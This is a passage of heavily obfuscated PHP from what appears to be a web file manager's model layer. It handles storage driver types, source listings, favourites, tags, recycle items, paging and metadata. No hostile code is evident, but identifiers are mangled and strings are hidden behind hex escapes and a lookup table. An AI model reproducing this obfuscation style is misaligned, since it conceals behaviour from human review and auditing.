($ñÂ¿’Ô‘ == $ÈÛ‰ËÙÄ[842] || $ñÂ¿’Ô‘ == $ÈÛ‰ËÙÄ[1419] || $ñÂ¿’Ô‘ == $ÈÛ‰ËÙÄ[1420]) { $òŠÊ³Å¤ = self::defaultDriverInit(); } else { if ($ñÂ¿’Ô‘ == $ÈÛ‰ËÙÄ[1303] || $ñÂ¿’Ô‘ == $ÈÛ‰ËÙÄ[1421]) { $òŠÊ³Å¤ = IO::init($òŠÊ³Å¤->pathParse[$ÈÛ‰ËÙÄ[1246]]); } } $€êä“Ì = $òŠÊ³Å¤->path; $ñÂ¿’Ô‘ = str_replace($ÈÛ‰ËÙÄ[1418], $ÈÛ‰ËÙÄ[12], strtolower($òŠÊ³Å¤->getType())); if ($ñÂ¿’Ô‘ == $ÈÛ‰ËÙÄ[109]) { return array($ÈÛ‰ËÙÄ[33] => $ÈÛ‰ËÙÄ[109], $ÈÛ‰ËÙÄ[1415] => $ÈÛ‰ËÙÄ[12], $ÈÛ‰ËÙÄ[87] => $€êä“Ì, $ÈÛ‰ËÙÄ[98] => $òŠÊ³Å¤); } return array($ÈÛ‰ËÙÄ[33] => $ÈÛ‰ËÙÄ[960], $ÈÛ‰ËÙÄ[1415] => $òŠÊ³Å¤->pathDriver, $ÈÛ‰ËÙÄ[87] => $€êä“Ì, $ÈÛ‰ËÙÄ[98] => $òŠÊ³Å¤); } public static function pathDriverType($êßğ…æ®) { return $êßğ…æ® ? self::driverType(IO::init($êßğ…æ®)) : !1; } public static function pathDriverLocal($˜·¹¶·) { $àÉÍíÎ€ =& $_SERVER[ˆö¿ÚÌ¼]; $¤õ‚»ª = $˜·¹¶· ? self::driverType(IO::init($˜·¹¶·)) : !1; return strtolower($¤õ‚»ª[$àÉÍíÎ€[33]]) == $àÉÍíÎ€[109] ? !0 : !1; } public static function allowCover($áÒëã, $üˆÖ³®ê = true) { $Ü’ŠÉ½• =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($áÒëã)) { $áÒëã = IO::info($áÒëã); } if (!$áÒëã || $áÒëã[$Ü’ŠÉ½•[33]] == $Ü’ŠÉ½•[78] || $áÒëã[$Ü’ŠÉ½•[79]] <= 100) { return !1; } if (isset($áÒëã[$Ü’ŠÉ½•[1422]]) || !$áÒëã[$Ü’ŠÉ½•[87]]) { return !1; } if (isset($áÒëã[$Ü’ŠÉ½•[235]]) && !$áÒëã[$Ü’ŠÉ½•[235]]) { return !1; } static $ŸÄ’°å° = false; if (!$ŸÄ’°å° || !$üˆÖ³®ê) { $á–÷³¦Æ = self::driverType(IO::init($áÒëã[$Ü’ŠÉ½•[87]])); $Ğú¿Ş¶† = $á–÷³¦Æ[$Ü’ŠÉ½•[98]]; $ŸÄ’°å° = $Ü’ŠÉ½•[197]; if ($á–÷³¦Æ[$Ü’ŠÉ½•[33]] == $Ü’ŠÉ½•[109]) { $ŸÄ’°å° = $Ü’ŠÉ½•[1423]; } if ($á–÷³¦Æ[$Ü’ŠÉ½•[98]] && is_array($á–÷³¦Æ[$Ü’ŠÉ½•[98]]->config)) { $®ñŠÌ¦™ = $á–÷³¦Æ[$Ü’ŠÉ½•[98]]->config; if (isset($®ñŠÌ¦™[$Ü’ŠÉ½•[1424]]) && $®ñŠÌ¦™[$Ü’ŠÉ½•[1424]]) { $ŸÄ’°å° = $Ü’ŠÉ½•[1423]; } } $²»»×“ = KodIO::defaultDriver(); if (strtolower($²»»×“[$Ü’ŠÉ½•[98]]) == $Ü’ŠÉ½•[109] && is_array($²»»×“[$Ü’ŠÉ½•[6]])) { $Â…ö‘ÒÙ = $²»»×“[$Ü’ŠÉ½•[6]][$Ü’ŠÉ½•[1276]]; if (substr($Â…ö‘ÒÙ, 0, 2) == $Ü’ŠÉ½•[1425]) { $Â…ö‘ÒÙ = str_replace($Ü’ŠÉ½•[1425], BASIC_PATH, $Â…ö‘ÒÙ); } $Â…ö‘ÒÙ = str_replace($Ü’ŠÉ½•[257], $Ü’ŠÉ½•[8], $Â…ö‘ÒÙ); if (substr($áÒëã[$Ü’ŠÉ½•[87]], 0, strlen($Â…ö‘ÒÙ)) == $Â…ö‘ÒÙ) { $ŸÄ’°å° = $Ü’ŠÉ½•[197]; } } } return $ŸÄ’°å° == $Ü’ŠÉ½•[1423] ? !0 : !1; } } goto f °ÆìØ­Õ; Cé ·À¯Ø”: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\143\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\x65" => "\151\157\x5f\x73\157\x75\x72\x63\x65\x5f\x6d\145\x74\141", "\x6d\x65\164\141\106\x69\145\154\x64" => "\163\157\165\162\143\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\x54\151\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\163\145\162\x74", "\146\x75\156\143\x74\151\157\156"), array("\x63\162\145\141\164\x65\x54\151\x6d\145", "\164\151\x6d\145", "\151\156\163\x65\162\164", "\146\165\156\x63\x74\151\157\156"), array("\x76\x69\145\167\124\151\x6d\145", "\x74\x69\155\145", "\151\x6e\163\145\162\x74", "\146\165\156\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($‘µ÷ó¡…) { return $this->listSource(array($_SERVER[ˆö¿ÚÌ¼][489] => $‘µ÷ó¡…)); } public function typeName($Â÷«°·ë) { static $¨×´µ† = array(self::TYPE_SYSTEM => "\163\171\x73\x74\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\165\x70"); return $¨×´µ†[$Â÷«°·ë . $_SERVER[ˆö¿ÚÌ¼][12]]; } public function sourceListInfo($Á™›§Û, $“ı’ä÷° = false) { $ÈÎ‹ÔÆâ =& $_SERVER[ˆö¿ÚÌ¼]; $Á™›§Û = $Á™›§Û ? $Á™›§Û : array(); $Á™›§Û = array_filter(array_unique($Á™›§Û)); if (!$Á™›§Û) { return array(); } $òó”Òù = $this->where(array($ÈÎ‹ÔÆâ[194] => array($ÈÎ‹ÔÆâ[7], $Á™›§Û)))->select(); $this->_listDataApply($òó”Òù, $“ı’ä÷°); return array_to_keyvalue($òó”Òù, $ÈÎ‹ÔÆâ[194]); } public function pathInfoFilter(&$ÇŠÔ¢ÖÉ) { $¬äÙ­Íî =& $_SERVER[ˆö¿ÚÌ¼]; static $ˆ†”ı» = false; static $³±¢õÎÏ = false; static $’Í·şØ = false; if (!$ˆ†”ı») { $¯Üà˜û… = $¬äÙ­Íî[490]; $¯Üà˜û… .= $¬äÙ­Íî[491]; $¯Üà˜û… .= $¬äÙ­Íî[492]; $‘¥³®ŠÔ = $¬äÙ­Íî[493]; $ñêæßğ = explode($¬äÙ­Íî[50], $‘¥³®ŠÔ); $ˆ†”ı» = explode($¬äÙ­Íî[50], $¯Üà˜û…); $³±¢õÎÏ = array(); foreach ($ˆ†”ı» as $äì¯Íçú) { if (in_array($äì¯Íçú, $ñêæßğ)) { continue; } $³±¢õÎÏ[] = $äì¯Íçú; } $’Í·şØ = explode($¬äÙ­Íî[50], $¬äÙ­Íî[494]); } foreach ($’Í·şØ as $„îŒõ¼¼) { if (isset($ÇŠÔ¢ÖÉ[$„îŒõ¼¼])) { $ÇŠÔ¢ÖÉ[$„îŒõ¼¼] = intval($ÇŠÔ¢ÖÉ[$„îŒõ¼¼]); } } $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[87]] = $¬äÙ­Íî[495] . $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[194]] . $¬äÙ­Íî[496]; $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[33]] = $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[497]] == 1 ? $¬äÙ­Íî[78] : $¬äÙ­Íî[233]; $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[191]] = $this->typeName($ÇŠÔ¢ÖÉ[$¬äÙ­Íî[191]]); if ($ÇŠÔ¢ÖÉ[$¬äÙ­Íî[497]] != 1) { $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[169]] = $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[498]]; unset($ÇŠÔ¢ÖÉ[$¬äÙ­Íî[498]]); } $‚£µöï½ = $ˆ†”ı»; if (isset($ÇŠÔ¢ÖÉ[$¬äÙ­Íî[499]]) && $ÇŠÔ¢ÖÉ[$¬äÙ­Íî[499]][$¬äÙ­Íî[500]] == -1) { $‚£µöï½ = $³±¢õÎÏ; } $ÇŠÔ¢ÖÉ = array_field_key($ÇŠÔ¢ÖÉ, $‚£µöï½); return $ÇŠÔ¢ÖÉ; } public function listUserFav() { $˜—ù«“ =& $_SERVER[ˆö¿ÚÌ¼]; $¸ıüßû± = Model($˜—ù«“[501])->listData(); $òÚÙ°¨İ = array_filter_by_field($¸ıüßû±, $˜—ù«“[33], $˜—ù«“[502]); $òÚÙ°¨İ = array_to_keyvalue($òÚÙ°¨İ, $˜—ù«“[12], $˜—ù«“[87]); if ($òÚÙ°¨İ) { $û‚•×Ïˆ = $this->listSource(array($˜—ù«“[503] => array($˜—ù«“[504], $òÚÙ°¨İ))); } $û‚•×Ïˆ = array_to_keyvalue($û‚•×Ïˆ[$˜—ù«“[448]], $˜—ù«“[194]); foreach ($¸ıüßû± as &$¯¤ÏìàÙ) { $¯¤ÏìàÙ = array($˜—ù«“[505] => $¯¤ÏìàÙ[$˜—ù«“[478]], $˜—ù«“[506] => $¯¤ÏìàÙ[$˜—ù«“[32]], $˜—ù«“[507] => $¯¤ÏìàÙ[$˜—ù«“[87]], $˜—ù«“[508] => $¯¤ÏìàÙ[$˜—ù«“[33]], $˜—ù«“[509] => $¯¤ÏìàÙ[$˜—ù«“[234]], $˜—ù«“[510] => $¯¤ÏìàÙ[$˜—ù«“[88]]); if ($¯¤ÏìàÙ[$˜—ù«“[33]] == $˜—ù«“[502] && $û‚•×Ïˆ[$¯¤ÏìàÙ[$˜—ù«“[87]]]) { $¯¤ÏìàÙ[$˜—ù«“[90]] = $û‚•×Ïˆ[$¯¤ÏìàÙ[$˜—ù«“[87]]]; } } unset($¯¤ÏìàÙ); return $¸ıüßû±; } public function listUserTag($Ñ»™óå­) { $èŸûÒ£İ =& $_SERVER[ˆö¿ÚÌ¼]; if ($Ñ»™óå­ && !is_array($Ñ»™óå­)) { $Ñ»™óå­ = array($Ñ»™óå­); } $ó“Î‰¾‚ = Model($èŸûÒ£İ[511])->listData(); $çâøú¤½ = array(); $×£ÅËùö = array(); foreach ($ó“Î‰¾‚ as $ı¼§ÜÍ¿) { $Èù°¯× = $ı¼§ÜÍ¿[$èŸûÒ£İ[87]]; if (!$Èù°¯×) { continue; } if (!isset($×£ÅËùö[$Èù°¯×])) { $×£ÅËùö[$Èù°¯×] = array(); } $×£ÅËùö[$Èù°¯×][] = $ı¼§ÜÍ¿[$èŸûÒ£İ[512]]; $çâøú¤½[$ı¼§ÜÍ¿[$èŸûÒ£İ[87]]] = $ı¼§ÜÍ¿; } $İ¡­ÅÈ¸ = array(); $¤Íèâ = array(); $Î†£Ùß† = array(); foreach ($×£ÅËùö as $‰¦ûœ¥§ => $§Ô”¿£’) { $‹Ú™…˜³ = !0; if (!$Ñ»™óå­) { $İ¡­ÅÈ¸[] = $‰¦ûœ¥§; continue; } foreach ($Ñ»™óå­ as $Í³ºÛ¦©) { if (!in_array($Í³ºÛ¦©, $§Ô”¿£’)) { $‹Ú™…˜³ = !1; break; } } if (!$‹Ú™…˜³) { continue; } if (!is_numeric($‰¦ûœ¥§)) { $‰¢ıÔÑÂ = $çâøú¤½[$‰¦ûœ¥§]; $ËïæšïÊ = array($èŸûÒ£İ[32] => $‰¢ıÔÑÂ[$èŸûÒ£İ[32]], $èŸûÒ£İ[87] => $‰¢ıÔÑÂ[$èŸûÒ£İ[87]], $èŸûÒ£İ[33] => $‰¢ıÔÑÂ[$èŸûÒ£İ[33]], $èŸûÒ£İ[90] => array($èŸûÒ£İ[513] => 1), $èŸûÒ£İ[235] => !0); if ($‰¢ıÔÑÂ[$èŸûÒ£İ[33]] == $èŸûÒ£İ[233]) { $Î†£Ùß†[] = $ËïæšïÊ; } if ($‰¢ıÔÑÂ[$èŸûÒ£İ[33]] == $èŸûÒ£İ[78]) { $¤Íèâ[] = $ËïæšïÊ; } continue; } $İ¡­ÅÈ¸[] = $‰¦ûœ¥§; } if ($İ¡­ÅÈ¸) { $ÒûÓÅ‚ = $this->listSource(array($èŸûÒ£İ[503] => array($èŸûÒ£İ[504], $İ¡­ÅÈ¸))); } $ÒûÓÅ‚ = $ÒûÓÅ‚ ? $ÒûÓÅ‚ : array($èŸûÒ£İ[85] => array(), $èŸûÒ£İ[86] => array()); $ÒûÓÅ‚[$èŸûÒ£İ[85]] = array_merge($ÒûÓÅ‚[$èŸûÒ£İ[85]], $¤Íèâ); $ÒûÓÅ‚[$èŸûÒ£İ[86]] = array_merge($ÒûÓÅ‚[$èŸûÒ£İ[86]], $Î†£Ùß†); if (isset($ÒûÓÅ‚[$èŸûÒ£İ[445]]) && count($İ¡­ÅÈ¸) == $ÒûÓÅ‚[$èŸûÒ£İ[445]][$èŸûÒ£İ[446]]) { return $ÒûÓÅ‚; } $½Ö±åè = array(); $²ˆ¿ù = array_to_keyvalue($ÒûÓÅ‚[$èŸûÒ£İ[85]], $èŸûÒ£İ[12], $èŸûÒ£İ[194]); $‹Òú³¶ö = array_to_keyvalue($ÒûÓÅ‚[$èŸûÒ£İ[86]], $èŸûÒ£İ[12], $èŸûÒ£İ[194]); $ÊĞ©ç«œ = array_merge($‹Òú³¶ö, $²ˆ¿ù); foreach ($İ¡­ÅÈ¸ as $Èù°¯×) { if (!in_array($Èù°¯×, $ÊĞ©ç«œ)) { $½Ö±åè[] = $Èù°¯×; } } if ($½Ö±åè) { Model($èŸûÒ£İ[514])->removeBySource($½Ö±åè); } return $ÒûÓÅ‚; } public function listUserRecycle() { $ ³€´ß® =& $_SERVER[ˆö¿ÚÌ¼]; $Ì«Ï»·û = Model($ ³€´ß®[515])->listData(); if (!$Ì«Ï»·û) { return array(); } $é€á±º = array($ ³€´ß®[503] => array($ ³€´ß®[504], $Ì«Ï»·û), $ ³€´ß®[516] => 1); return $this->listSource($é€á±º); } public function listSource($‘èúÀŠ, $»¬Çèâ¢ = 3000, $èßñÓõ = false) { $Ö„ñ‘ó =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($‘èúÀŠ[$Ö„ñ‘ó[517]])) { $‘èúÀŠ[$Ö„ñ‘ó[517]] = 0; } if (isset($‘èúÀŠ[$Ö„ñ‘ó[193]]) && $‘èúÀŠ[$Ö„ñ‘ó[193]] == $Ö„ñ‘ó[231]) { $‘èúÀŠ[$Ö„ñ‘ó[498]] = array($Ö„ñ‘ó[518], $Ö„ñ‘ó[12]); } $¤ùÕ¥§Ì = $Ö„ñ‘ó[519]; $çšâ¸Í = $this->field($¤ùÕ¥§Ì)->_makeOrder()->where($‘èúÀŠ)->selectPage($»¬Çèâ¢); $this->_listPageCheck($çšâ¸Í, $¤ùÕ¥§Ì, $‘èúÀŠ); $this->_listDataApply($çšâ¸Í[$Ö„ñ‘ó[448]], $èßñÓõ); $this->_listMake($çšâ¸Í); return $çšâ¸Í; } private function _listPageCheck(&$âş¾ÅÙÅ, $àùô“çÕ, $Ö¥”ø…à) { $±òúÏ¾ =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_array($âş¾ÅÙÅ[$±òúÏ¾[445]])) { return; } $âÔÂÃ›š = $âş¾ÅÙÅ[$±òúÏ¾[445]]; if ($âÔÂÃ›š[$±òúÏ¾[447]] <= 1) { return; } if ($âÔÂÃ›š[$±òúÏ¾[446]] >= 100000) { return; } if (Model($±òúÏ¾[520])->get($±òúÏ¾[521]) != $±òúÏ¾[522]) { return; } $àùô“çÕ = str_replace(array($±òúÏ¾[53], $±òúÏ¾[420], $±òúÏ¾[288]), $±òúÏ¾[12], $àùô“çÕ); $àùô“çÕ = $±òúÏ¾[523] . str_replace($±òúÏ¾[50], $±òúÏ¾[524], $àùô“çÕ) . $±òúÏ¾[525]; $Ï÷ı½¤¶ = $±òúÏ¾[526]; $Ï÷ı½¤¶ = $Ï÷ı½¤¶ . $±òúÏ¾[527]; $ºƒîòğğ = $âÔÂÃ›š[$±òúÏ¾[442]] * ($âÔÂÃ›š[$±òúÏ¾[431]] - 1) . $±òúÏ¾[50] . $âÔÂÃ›š[$±òúÏ¾[442]]; $ƒŞ×ò–º = $this->_makeOrder(!0); $¥ı™Ó™À = $±òúÏ¾[523] . str_replace($±òúÏ¾[50], $±òúÏ¾[524], $ƒŞ×ò–º[0]); if (strpos($¥ı™Ó™À, $±òúÏ¾[528])) { $¥ı™Ó™À = str_replace($±òúÏ¾[528], $±òúÏ¾[529], $¥ı™Ó™À); } else { $¥ı™Ó™À .= $±òúÏ¾[530] . $ƒŞ×ò–º[1]; } $Ìäõò¬¯ = array(); foreach ($Ö¥”ø…à as $æ§­¾ => $›Â§Ã‚) { $Ìäõò¬¯[$±òúÏ¾[523] . $æ§­¾] = $›Â§Ã‚; } $this->alias($±òúÏ¾[531])->field($àùô“çÕ)->limit($ºƒîòğğ)->order($¥ı™Ó™À); $âä¹¶ŸÃ = $this->join($Ï÷ı½¤¶)->where($Ìäõò¬¯)->select(); if ($âä¹¶ŸÃ) { $âş¾ÅÙÅ[$±òúÏ¾[448]] = $âä¹¶ŸÃ; } } protected function _makeOrder($•ÚÊîşÜ = false) { $Ä™¼¹Ù =& $_SERVER[ˆö¿ÚÌ¼]; $ûæÑÅá½ = Model($Ä™¼¹Ù[532])->get($Ä™¼¹Ù[533]); $›ŸŒÊ…¾ = Model($Ä™¼¹Ù[532])->get($Ä™¼¹Ù[534]); $¢÷ğÉ¾û = array($Ä™¼¹Ù[535] => $Ä™¼¹Ù[536], $Ä™¼¹Ù[537] => $Ä™¼¹Ù[538]); $€â¤˜·² = array($Ä™¼¹Ù[32] => $Ä™¼¹Ù[32], $Ä™¼¹Ù[79] => $Ä™¼¹Ù[79], $Ä™¼¹Ù[169] => $Ä™¼¹Ù[498], $Ä™¼¹Ù[539] => $Ä™¼¹Ù[539], $Ä™¼¹Ù[540] => $Ä™¼¹Ù[541], $Ä™¼¹Ù[234] => $Ä™¼¹Ù[234], $Ä™¼¹Ù[88] => $Ä™¼¹Ù[88]); $Şâšƒã÷ = Input::get($Ä™¼¹Ù[542], $Ä™¼¹Ù[7], $ûæÑÅá½, array_keys($€â¤˜·²)); $×ôš•ã = Input::get($Ä™¼¹Ù[543], $Ä™¼¹Ù[7], $›ŸŒÊ…¾, array_keys($¢÷ğÉ¾û)); if (!in_array($Şâšƒã÷, array_keys($€â¤˜·²))) { $Şâšƒã÷ = $Ä™¼¹Ù[32]; } if (!in_array($×ôš•ã, array_keys($¢÷ğÉ¾û))) { $Şâšƒã÷ = $Ä™¼¹Ù[535]; } if ($Şâšƒã÷ == $Ä™¼¹Ù[32]) { } $–Ã¶«Ç = $Ä™¼¹Ù[544] . $€â¤˜·²[$Şâšƒã÷] . $Ä™¼¹Ù[53] . $¢÷ğÉ¾û[$×ôš•ã]; $–Ã¶«Ç = rtrim(trim($–Ã¶«Ç), $Ä™¼¹Ù[50]); if ($•ÚÊîşÜ) { return array($–Ã¶«Ç, $¢÷ğÉ¾û[$×ôš•ã]); } return $this->order($–Ã¶«Ç); } protected function _listDataApplyItem($÷íó”Ö‡, $ø§Ñ€å = false) { $¤°Àö“‘ = array($÷íó”Ö‡); $this->_listDataApply($¤°Àö“‘, $ø§Ñ€å); return $¤°Àö“‘[0]; } protected function _listDataApply(&$”ØŠ™ïõ, $çÜ‚’ = false) { $•ºÕˆ¤Ç =& $_SERVER[ˆö¿ÚÌ¼]; if (!$”ØŠ™ïõ) { $”ØŠ™ïõ = array(); return; } $§Ã©ëÏİ = array_to_keyvalue($”ØŠ™ïõ, $•ºÕˆ¤Ç[12], $•ºÕˆ¤Ç[194]); $§Ã©ëÏİ = array_unique($§Ã©ëÏİ); $this->_listSourceCache($”ØŠ™ïõ); if (!$çÜ‚’) { $this->_listAppendMeta($”ØŠ™ïõ, $§Ã©ëÏİ); $this->_listAppendFileMeta($”ØŠ™ïõ, $§Ã©ëÏİ); $this->_listAppendChildren($”ØŠ™ïõ, $§Ã©ëÏİ); } $this->_listAppendPath($”ØŠ™ïõ); $this->_listAppendAuth($”ØŠ™ïõ); $this->_listAppendSourceInfo($”ØŠ™ïõ, $§Ã©ëÏİ); $this->_listAppendUser($”ØŠ™ïõ); $this->_listFilterInfo($”ØŠ™ïõ, $çÜ‚’); $this->_listAppendAuthSecret($”ØŠ™ïõ); } protected function _listSourceCache($Ã» ´ü›) { $»‰Öğ® =& $_SERVER[ˆö¿ÚÌ¼]; foreach ($Ã» ´ü› as $çôïï¤ç) { self::$cacheSourceInfo[$»‰Öğ®[545] . $çôïï¤ç[$»‰Öğ®[194]]] = $çôïï¤ç; } } protected function _listFilterInfo(&$‹áÀ“ŠÒ, $Êû±†Şç = false) { $¬Î‚¦Á =& $_SERVER[ˆö¿ÚÌ¼]; foreach ($‹áÀ“ŠÒ as &$°ƒå¤ÕÎ) { $°ƒå¤ÕÎ = $this->pathInfoFilter($°ƒå¤ÕÎ); self::$cachePathInfo[$¬Î‚¦Á[546] . intval($Êû±†Şç) . $¬Î‚¦Á[465] . $°ƒå¤ÕÎ[$¬Î‚¦Á[194]]] = $°ƒå¤ÕÎ; } unset($°ƒå¤ÕÎ); } protected function _listMake(&$­éù•±Ï) { $“óÙÇ“ =& $_SERVER[ˆö¿ÚÌ¼]; $­éù•±Ï[$“óÙÇ“[85]] = array(); $­éù•±Ï[$“óÙÇ“[86]] = array(); foreach ($­éù•±Ï[$“óÙÇ“[448]] as $âŸœ”«™) { $›„È„ÆÊ = $âŸœ”«™[$“óÙÇ“[497]] == 1 ? $“óÙÇ“[85] : $“óÙÇ“[86]; $­éù•±Ï[$›„È„ÆÊ][] = $âŸœ”«™; } unset($­éù•±Ï[$“óÙÇ“[448]]); } protected function _listAppendMeta(&$¾ûæî¦õ, $¢øÓÅÑÃ) { $¼£¸Ù­ =& $_SERVER[ˆö¿ÚÌ¼]; $§°Ë¦Ğó = array($¼£¸Ù­[503] => array($¼£¸Ù­[504], $¢øÓÅÑÃ)); $·µØ÷š· = Model($¼£¸Ù­[547])->field($¼£¸Ù­[548])->where($§°Ë¦Ğó)->select(); if (!$·µØ÷š·) { return; } $ÀÏù¾¡ = array($¼£¸Ù­[549], $¼£¸Ù­[550], $¼£¸Ù­[529]); $âôÙ•…‹ = array(); foreach ($·µØ÷š· as $Úàº§Üı) { if (!isset($âôÙ•…‹[$Úàº§Üı[$¼£¸Ù­[194]]])) { $âôÙ•…‹[$Úàº§Üı[$¼£¸Ù­[194]]] = array(); } if (in_array($Úàº§Üı[$¼£¸Ù­[97]], $ÀÏù¾¡)) { continue; } if ($Úàº§Üı[$¼£¸Ù­[97]] == $¼£¸Ù­[551]) { $Úàº§Üı[$¼£¸Ù­[453]] = $¼£¸Ù­[552]; } $âôÙ•…‹[$Úàº§Üı[$¼£¸Ù­[194]]][$Úàº§Üı[$¼£¸Ù­[97]]] = $Úàº§Üı[$¼£¸Ù­[453]]; } foreach ($¾ûæî¦õ as &$‰À”¬£œ) { $‰À”¬£œ[$¼£¸Ù­[553]] = !1; if (isset($âôÙ•…‹[$‰À”¬£œ[$¼£¸Ù­[194]]])) { $‰À”¬£œ[$¼£¸Ù­[553]] = $âôÙ•…‹[$‰À”¬£œ[$¼£¸Ù­[194]]]; } if ($this->fileIsLock($‰À”¬£œ) && $‰À”¬£œ[$¼£¸Ù­[499]]) { $Ñ“ª–­“ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‰À”¬£œ[$¼£¸Ù­[499]][$¼£¸Ù­[500]] = AuthModel::authDisable($‰À”¬£œ[$¼£¸Ù­[499]][$¼£¸Ù­[500]], $Ñ“ª–­“); $‰À”¬£œ[$¼£¸Ù­[499]][$¼£¸Ù­[554]][$¼£¸Ù­[499]] = $‰À”¬£œ[$¼£¸Ù­[499]][$¼£¸Ù­[500]]; } } unset($‰À”¬£œ); } protected function _listAppendFileMeta(&$·Ø¯·à, $›ä”ÙÀ¤) { $ø¸èéÃÔ =& $_SERVER[ˆö¿ÚÌ¼]; $ñÍÛåîœ = array_to_keyvalue($·Ø¯·à, $ø¸èéÃÔ[12], $ø¸èéÃÔ[555]); $ñÍÛåîœ = array_filter(array_unique($ñÍÛåîœ)); if (!$ñÍÛåîœ) { return; } $±¥è’¿† = array($ø¸èéÃÔ[556] => array($ø¸èéÃÔ[504], $ñÍÛåîœ)); $Ùˆú¨‰ˆ = $ø¸èéÃÔ[557]; $ïë³›¬… = Model($ø¸èéÃÔ[558])->field($Ùˆú¨‰ˆ)->where($±¥è’¿†)->select(); $ïë³›¬… = array_to_keyvalue($ïë³›¬…, $ø¸èéÃÔ[555]); $ÒáºŠß’ = Model($ø¸èéÃÔ[559])->field($ø¸èéÃÔ[560])->where($±¥è’¿†)->select(); $ÒáºŠß’ = $ÒáºŠß’ ? $ÒáºŠß’ : array(); $Í¢¢å„º = array(); foreach ($ÒáºŠß’ as $Ó±–éòë) { if (!isset($Í¢¢å„º[$Ó±–éòë[$ø¸èéÃÔ[555]]])) { $Í¢¢å„º[$Ó±–éòë[$ø¸èéÃÔ[555]]] = array(); } $Í¢¢å„º[$Ó±–éòë[$ø¸èéÃÔ[555]]][$Ó±–éòë[$ø¸èéÃÔ[97]]] = $Ó±–éòë[$ø¸èéÃÔ[453]]; } foreach ($·Ø¯·à as &$€ˆÆËÕ®) { $÷€¯ë³ = $€ˆÆËÕ®[$ø¸èéÃÔ[555]]; if (!$÷€¯ë³ || !is_array($ïë³›¬…[$÷€¯ë³])) { continue; } $¯Ù¹ÕÜÂ = $ïë³›¬…[$÷€¯ë³]; $¯Ù¹ÕÜÂ[$ø¸èéÃÔ[79]] = $€ˆÆËÕ®[$ø¸èéÃÔ[79]]; $¯Ù¹ÕÜÂ[$ø¸èéÃÔ[32]] = $€ˆÆËÕ®[$ø¸èéÃÔ[32]]; if (!$¯Ù¹ÕÜÂ[$ø¸èéÃÔ[561]]) { Model($ø¸èéÃÔ[558])->fileMd5Check($¯Ù¹ÕÜÂ); } if (!isset(self::$cacheFileInfo[$ø¸èéÃÔ[562] . $÷€¯ë³])) { self::$cacheFileInfo[$ø¸èéÃÔ[562] . $÷€¯ë³] = array_merge(array(), $¯Ù¹ÕÜÂ); } unset($ïë³›¬…[$÷€¯ë³][$ø¸èéÃÔ[87]]); $ÔÑäËÜ¬ = isset($Í¢¢å„º[$÷€¯ë³]) && is_array($Í¢¢å„º[$÷€¯ë³]) ? $Í¢¢å„º[$÷€¯ë³] : array(); $€ˆÆËÕ®[$ø¸èéÃÔ[170]] = array_merge($ÔÑäËÜ¬, $ïë³›¬…[$÷€¯ë³]); if (isset($€ˆÆËÕ®[$ø¸èéÃÔ[170]][$ø¸èéÃÔ[185]])) { $€ˆÆËÕ®[$ø¸èéÃÔ[185]] = json_decode($€ˆÆËÕ®[$ø¸èéÃÔ[170]][$ø¸èéÃÔ[185]], !0); unset($€ˆÆËÕ®[$ø¸èéÃÔ[170]][$ø¸èéÃÔ[185]]); } } unset($€ˆÆËÕ®); } protected function _listAppendSourceInfo(&$œ¥á˜ºÉ, $äÌø™ê ) { $™ê½€úÙ =& $_SERVER[ˆö¿ÚÌ¼]; $Åé¶š²î = Model($™ê½€úÙ[563])->listData(); $‰‡ñÑó = Model($™ê½€úÙ[511])->listData(); $Ù¶åºµé = Model($™ê½€úÙ[501])->listData(); $€„¯ÍÅ’ = Model($™ê½€úÙ[564])->listSimple(); $Ö‹µßá¨ = array_to_keyvalue($Åé¶š²î, $™ê½€úÙ[478]); $ú ‘†²‘ = array_to_keyvalue_group($‰‡ñÑó, $™ê½€úÙ[87], $™ê½€úÙ[512]); $ıšÊ­åŒ = array_to_keyvalue($Ù¶åºµé, $™ê½€úÙ[87]); $‡“¿¿˜× = array_to_keyvalue_group($€„¯ÍÅ’, $™ê½€úÙ[194]); foreach ($œ¥á˜ºÉ as &$Îù‘•¸û) { $Îù‘•¸û[$™ê½€úÙ[90]] = array($™ê½€úÙ[565] => 0, $™ê½€úÙ[566] => 0, $™ê½€úÙ[567] => 0); if (isset($ıšÊ­åŒ[$Îù‘•¸û[$™ê½€úÙ[194]]])) { $Îù‘•¸û[$™ê½€úÙ[90]][$™ê½€úÙ[568]] = 1; $Îù‘•¸û[$™ê½€úÙ[90]][$™ê½€úÙ[569]] = $ıšÊ­åŒ[$Îù‘•¸û[$™ê½€úÙ[194]]][$™ê½€úÙ[32]]; } if ($ú ‘†²‘ && $Ö‹µßá¨ && isset($ú ‘†²‘[$Îù‘•¸û[$™ê½€úÙ[194]]])) { $Îù‘•¸û[$™ê½€úÙ[90]][$™ê½€úÙ[570]] = array(); foreach ($ú ‘†²‘[$Îù‘•¸û[$™ê½€úÙ[194]]] as $Äàí›ÂÕ) { $áèĞ«± = $Ö‹µßá¨[$Äàí›ÂÕ]; $Îù‘•¸û[$™ê½€úÙ[90]][$™ê½€úÙ[570]][] = array($™ê½€úÙ[571] => $áèĞ«±[$™ê½€úÙ[478]], $™ê½€úÙ[506] => $áèĞ«±[$™ê½€úÙ[32]], $™ê½€úÙ[572] => $áèĞ«±[$™ê½€úÙ[573]]); } } if ($‡“¿¿˜× && isset($‡“¿¿˜×[$Îù‘•¸û[$™ê½€úÙ[194]]])) { 